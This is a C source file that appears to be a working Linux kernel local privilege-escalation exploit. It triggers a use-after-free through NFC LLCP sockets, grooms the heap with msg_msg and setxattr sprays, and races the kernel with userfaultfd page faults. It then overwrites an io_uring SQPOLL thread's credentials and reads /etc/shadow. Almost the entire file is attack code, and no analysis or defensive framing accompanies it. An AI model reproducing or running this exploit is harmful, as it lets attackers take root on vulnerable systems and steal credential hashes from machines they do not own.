#include <sys/socket.h>
#include <linux/nfc.h>
#include <string.h>
#include <memory.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/xattr.h>
#include <liburing.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <poll.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <errno.h>
#include <linux/types.h>

#include "decls_globals.h"

int userfaultfd(int flags)
{
	return syscall(SYS_userfaultfd, flags);
}

int
do_msgrcv(int x)
{
	char buf[BUFF_SIZE];
	struct msgbuf* msg = buf;

	for (int i = 0; i < x; i++) {
		msgrcv(msqid[i], msg, BUFF_SIZE, i + 1, 0);
	}
}

int
do_msgsnd(int x)
{
	char buf[BUFF_SIZE];
	struct msgbuf* msg = buf;

	for (int i = 0; i < x; i++) {
		msg->mtype = i + 1;
		msqid[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		msgsnd(msqid[i], msg, BUFF_SIZE, 0);
	}
}

int
setup_userfaultfd(char* page)
{
	int ufd = userfaultfd(O_NONBLOCK);

	struct uffdio_api api = { .api = UFFD_API, .features = 0 };
	ioctl(ufd, UFFDIO_API, &api);

	if (! (api.ioctls & _UFFDIO_WRITEPROTECT)) {
		printf("write protect unavailable?\n");
	}

	struct uffdio_register reg = {
		.mode = UFFDIO_REGISTER_MODE_MISSING,
		.range = {
			.start = ((long)page) + PAGESIZE,
			.len = PAGESIZE
		}
	};
	ioctl(ufd, UFFDIO_REGISTER, &reg);
	return ufd;
}

int
setup_wp_userfaultfd(char* page)
{
	page[0] = 0;
	page[4096] = 0;

	int ufd = userfaultfd(O_NONBLOCK);

	struct uffdio_api api = { .api = UFFD_API, .features = 0 };
	ioctl(ufd, UFFDIO_API, &api);

	struct uffdio_register reg = {
		.mode = UFFDIO_REGISTER_MODE_WP,
		.range = {
			.start = ((long)page) + PAGESIZE,
			.len = PAGESIZE
		}
	};
	ioctl(ufd, UFFDIO_REGISTER, &reg);

	return ufd;
}

struct local*
	setup_localhdr(char* page)
{
	struct local* lc = (struct local*)((long)page
					 + (PAGESIZE - sizeof(struct local)));

	lc->list.next = lc;
	lc->list.prev = lc;
	lc->ref.refcount.refs.counter = 1;

	return lc;
}

char*
setup_mhdr(char* page)
{
	return (long)page + (PAGESIZE - sizeof(struct msg_msg));
}

char*
mmap_leaves()
{
	return mmap(NULL, PAGESIZE * 2, PROT_WRITE | PROT_READ,
								 MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
}

void
mprot_leaf(char* page, int flag)
{
	mprotect((long)page + PAGESIZE, (PAGESIZE), flag);
}

char*
create_thread(int id, int offset, pthread_t* thread, struct pargs* pa)
{
	char* page = mmap_leaves();
	if (page == MAP_FAILED) {
		printf("ERROR in %d mmap\n", id);
	}
	pa->page = page;
	if (id != 'z') {
		pa->fd = setup_userfaultfd(page);
	} else {
		pa->fd = setup_wp_userfaultfd(page);
	}
	pa->id = id;

	pthread_create(thread, NULL, handle_pfault, pa);

	return page;
}

void
h_fault(struct pargs* pa)
{
	pthread_mutex_lock(&lock_h[0]);

	for (;;) {
		struct pollfd pollfd;
		pollfd.fd = pa->fd;
		pollfd.events = POLLIN;
		int n = poll(&pollfd, 1, -1);

		if (n) {
			int rfd = open("/etc/", O_RDONLY);
			char* fname = "shadow";

			struct io_uring_sqe* sqe;
			sqe = io_uring_get_sqe(&ring);

			char str[BUFF_SIZE];
			io_uring_prep_openat(sqe, rfd, fname, O_RDONLY, S_IRUSR);
			io_uring_submit(&ring);

			struct io_uring_cqe* cqe;
			io_uring_wait_cqe(&ring, &cqe);
			printf("got cqe %d\n", cqe->res);
			io_uring_cqe_seen(&ring, cqe);

			sqe = io_uring_get_sqe(&ring);
			io_uring_prep_read(sqe, cqe->res, str, BUFF_SIZE, 1);

			io_uring_submit(&ring);

			io_uring_wait_cqe(&ring, &cqe);
			printf("got cqe %d\n", cqe->res);

			printf("%s", str);

			io_uring_queue_exit(&ring);

			// sleep forever
			printf("beginning cleanup routine\n");
			pthread_mutex_lock(&lock_h[1]);
		}
	}
}


void
t_fault(struct pargs* pa)
{
	for (;;) {
		struct pollfd pollfd;
		pollfd.fd = pa->fd;
		pollfd.events = POLLIN;
		int n = poll(&pollfd, 1, -1);

		if (n) {
			int nread = read(pa->fd, &pa->msg, sizeof(struct uffd_msg));
			// sleep forever
			pthread_mutex_lock(&lock_t[1]);
		}
	}
}

void
z_fault(struct pargs* pa)
{
	for (;;) {
		struct pollfd pollfd;
		pollfd.fd = pa->fd;
		pollfd.events = POLLIN;
		int n = poll(&pollfd, 1, -1);

		if (n) {
			int nread = read(pa->fd, &pa->msg, sizeof(struct uffd_msg));

			if (pa->msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WP) {
	
				// unblock main 
				char buf[BUFF_SIZE];
				struct uffdio_copy uffdio_copy_x;
				uffdio_copy_x.src = buf;
				uffdio_copy_x.dst = (unsigned long)X.msg.arg.pagefault.address;
				uffdio_copy_x.len = PAGESIZE;
				uffdio_copy_x.mode = 0;
				uffdio_copy_x.copy = 0;
				ioctl(X.fd, UFFDIO_COPY, &uffdio_copy_x);

				// alloc io_uring
				io_uring_queue_init(8, &ring, IORING_SETUP_SQPOLL);

				// restart the copy_to_user() in thread Y
				struct uffdio_writeprotect uffd_wp = {
					.mode = 0,
					.range = {
						.start = ((long)Z.page + PAGESIZE),
						.len = PAGESIZE
					}
				};
				ioctl(Z.fd, UFFDIO_WRITEPROTECT, &uffd_wp);
				pthread_mutex_lock(&lock_z[1]);

				// hold A forever
				pthread_t thread_t;
				pthread_mutex_lock(&lock_t[1]);
				char* page_t = create_thread('t', 0, &thread_t, &T);
				mprot_leaf(page_t, PROT_WRITE & ~(PROT_READ));
				setxattr("/home/guest/", "hiT", page_t + PAGESIZE, BUFF_SIZE, XATTR_REPLACE);

				pthread_join(thread_t, NULL);
			}
		}
	}
}

void
y_fault(struct pargs* pa)
{
	for (;;) {
		struct pollfd pollfd;
		pollfd.fd = pa->fd;
		pollfd.events = POLLIN;
		int n = poll(&pollfd, 1, -1);

		if (n) {
			int nread = read(pa->fd, &pa->msg, sizeof(struct uffd_msg));

			// free S3->L
			close(sock3);

			// reallocate A
			char buf[BUFF_SIZE];
			struct msgbuf* msgb = buf;
			msgb->mtype = 5;
			int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
			msgsnd(msqid, msgb, BUFF_SIZE, 0);

			// prepare the w thread
			pthread_t thread_z;
			pthread_mutex_lock(&lock_z[1]);
			char* page_z = create_thread('z', 0, &thread_z, &Z);
			Z.page = page_z;
			long* mhdr = setup_mhdr(page_z);

			struct uffdio_writeprotect uffd_wp = {
				.mode = UFFDIO_WRITEPROTECT_MODE_WP,
				.range = {
					.start = ((long)page_z) + PAGESIZE,
					.len = PAGESIZE
				}
			};
			ioctl(Z.fd, UFFDIO_WRITEPROTECT, &uffd_wp);

			// prepare to leak msgrcv and page fault at msg->mtext
			msgrcv(msqid, mhdr, BUFF_SIZE, 5, 0);
			pthread_mutex_unlock(&lock_z[1]);

			// patch sq_creds to elevate privileges
			mhdr[78] -= CREDS_SZ;

			// continue to write over R
			struct uffdio_copy uffdio_copy;
			uffdio_copy.src = mhdr;
			uffdio_copy.dst = (unsigned long)pa->msg.arg.pagefault.address;
			uffdio_copy.len = PAGESIZE;
			uffdio_copy.mode = 0;
			uffdio_copy.copy = 0;
			ioctl(pa->fd, UFFDIO_COPY, &uffdio_copy);

			// finally, hold A again so someone else
			// doesn't corrupt R
			pthread_t thread_h;
			pthread_mutex_lock(&lock_h[0]);
			pthread_mutex_lock(&lock_h[1]);
			char* page_h = create_thread('h', 0, &thread_h, &H);
			mprot_leaf(page_h, PROT_WRITE & ~(PROT_READ));
			pthread_mutex_unlock(&lock_h[0]);
			setxattr("/home/guest/", "hiH", page_h + PAGESIZE, BUFF_SIZE, XATTR_REPLACE);
		}
	}
}

void
x_fault(struct pargs* pa)
{
	//printf("inside thread x\n");

	for (;;) {
		struct pollfd pollfd;
		pollfd.fd = pa->fd;
		pollfd.events = POLLIN;
		int n = poll(&pollfd, 1, -1);

		if (n) {
			int nread = read(pa->fd, &pa->msg, sizeof(struct uffd_msg));

			// free S2->L
			close(sock2);

			// setup y thread
			pthread_t thread_y;
			pthread_mutex_lock(&lock_y[1]);
			char* page_y = create_thread('y', 0, &thread_y, &Y);
			struct local* lc_y = (page_y + (PAGESIZE - sizeof(struct msg_msg) + 8));
			lc_y->list.next = lc_y;
			lc_y->list.prev = lc_y;
			lc_y->ref.refcount.refs.counter = 1;

			mprot_leaf(page_y, PROT_WRITE & ~(PROT_READ));

			// allocate A again
			setxattr("/home/guest/", "hiY", lc_y, BUFF_SIZE, XATTR_REPLACE);

			// wait to progress to free(L)
			pthread_mutex_lock(&lock_x[1]);
		}
	}
}

void*
handle_pfault(void* arg)
{
	struct pargs* pa = (struct pargs*)arg;

	for (;;) {
		// do work
		switch (pa->id) {
		case 'x':
			x_fault(pa);
			break;
		case 'y':
			y_fault(pa);
			break;
		case 'z':
			z_fault(pa);
			break;
		case 't':
			t_fault(pa);
			break;
		case 'h':
			h_fault(pa);
		default:
			break;
		};
		break;
	}
}

int
main(int argc, char *argv[])
{
	// make the heap less messy
	do_msgsnd(8);

	struct sockaddr_nfc_llcp addr = { 0 };
	sock1 = socket(AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP);
	sock2 = socket(AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP);
	sock3 = socket(AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP);

	printf("%d %d %d\n", sock1, sock2, sock3);

	// free dummy objects
	do_msgrcv(8);

	addr.sa_family = AF_NFC;
	addr.nfc_protocol = NFC_PROTO_NFC_DEP;
	// all of these binds must fail
	bind(sock1, (struct sockaddr*)&addr, sizeof(struct sockaddr_nfc_llcp));
	bind(sock2, (struct sockaddr*)&addr, sizeof(struct sockaddr_nfc_llcp));
	bind(sock3, (struct sockaddr*)&addr, sizeof(struct sockaddr_nfc_llcp));

	// free S1->L
	close(sock1);

	// remove the other allocations
	do_msgsnd(7);
	
	// mmap page, setup userfaultfd, init thread X
	pthread_t thread_x;
	pthread_mutex_lock(&lock_x[1]);
	char* page_x = create_thread('x', 0, &thread_x, &X);
	
	// overwrite the refcount for each page 
	struct local* lc_x = setup_localhdr(page_x);

	// set page perms
	mprot_leaf(page_x, PROT_WRITE & ~(PROT_READ));

	// now the next allocation should be L
	setxattr("/home/guest/", "hiX", lc_x, BUFF_SIZE, XATTR_REPLACE);

	pthread_join(thread_x, NULL);
	
	return 0;
}
